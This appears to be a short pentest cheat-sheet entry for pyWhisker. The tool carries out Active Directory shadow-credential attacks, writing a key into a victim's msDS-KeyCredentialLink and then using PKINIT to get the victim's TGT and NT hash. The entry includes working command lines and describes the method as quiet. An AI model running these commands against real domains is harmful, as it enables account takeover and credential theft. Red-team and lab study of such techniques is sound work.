# pyWhisker

**Tags:** `#pywhisker` `#shadowcredentials` `#keycredentiallink` `#pkinit` `#activedirectory` `#privesc`

Linux/Python port of Whisker — abuses **shadow credentials**. With `GenericWrite`/`GenericAll` over a target user or computer, pyWhisker writes a key pair into the target's `msDS-KeyCredentialLink` attribute; that key can then be used with PKINIT to obtain a TGT (and the NT hash via UnPAC-the-hash) **as the target**, with no password change and no ADCS enrollment. Cleaner than a password reset — reversible and quiet.

**Source:** https://github.com/ShutdownRepo/pywhisker
**Install:** `pipx install pywhisker` (needs a Windows Server 2016+ DC for KeyCredentialLink support).

```bash
# Add a shadow credential; outputs a PFX + its password
pywhisker.py -d <domain> -u <user> -p <pass> --target <victim> --action add
# Then get the victim's TGT via PKINIT (PKINITtools)
gettgtpkinit.py -cert-pfx <out>.pfx -pfx-pass <pw> '<domain>/<victim>' victim.ccache
# List / remove entries
pywhisker.py -d <domain> -u <user> -p <pass> --target <victim> --action list
```

Consume the resulting cert on Windows with [[Tools/Auth/Rubeus|Rubeus]] (`asktgt /certificate`); PKINIT side via [[Tools/AD/PKINITtools|PKINITtools]].

---

> [!note] **See also** — [[Services/Active Directory/ACL Abuse|ACL Abuse]] — shadow-credential path for `GenericWrite`/`GenericAll` → passwordless auth as the target.

---

*Created: 2026-09-25*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
